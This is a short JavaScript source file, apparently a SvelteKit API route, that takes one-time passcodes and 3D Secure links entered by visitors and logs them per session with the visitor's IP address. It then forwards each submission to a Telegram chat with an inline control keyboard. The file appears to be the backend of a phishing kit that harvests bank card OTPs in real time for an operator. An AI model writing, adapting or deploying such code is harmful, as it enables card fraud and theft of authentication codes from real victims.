import { sendTelegram, buildKeyboard } from '$lib/telegram.js';
import { saveData, pushHistory } from '$lib/sessions.js';
import { inc } from '$lib/stats.js';
import { json } from '@sveltejs/kit';

/**
 * Send OTP / 3DS submissions to Telegram with the right inline keyboard.
 * Body: { type: 'otp'|'3ds', sessionId, value, attempt }
 *
 * @type {import('./$types').RequestHandler}
 */
export async function POST({ request, url, getClientAddress }) {
  const { type, sessionId, value, attempt } = await request.json().catch(() => ({}));

  if (!sessionId || !type) return json({ ok: false }, { status: 400 });

  const ip = getClientAddress();
  const date = new Date().toISOString();
  const baseUrl = `${url.protocol}//${url.host}`;

  let message = '';
  let keyboard;

  if (type === 'otp') {
    saveData(sessionId, { lastOtp: value });
    pushHistory(sessionId, 'otps', value);
    inc('otps');
    message =
`🔑 *OTP Code*

⏰ ${date}
🌍 IP: \`${ip}\`

🔢 Code: \`${value}\`
🔄 Attempt: ${attempt ?? 1}
🔑 Session: \`${sessionId}\``;
    keyboard = buildKeyboard(sessionId, baseUrl, 'otp');
  } else if (type === '3ds') {
    saveData(sessionId, { lastLink: value });
    pushHistory(sessionId, 'links', value);
    inc('links3ds');
    message =
`🔗 *3D Secure Link*

⏰ ${date}
🌍 IP: \`${ip}\`

🔗 Link: \`${value}\`
🔄 Attempt: ${attempt ?? 1}
🔑 Session: \`${sessionId}\``;
    keyboard = buildKeyboard(sessionId, baseUrl, '3ds');
  } else {
    return json({ ok: false }, { status: 400 });
  }

  await sendTelegram(message, keyboard);
  return json({ ok: true });
}
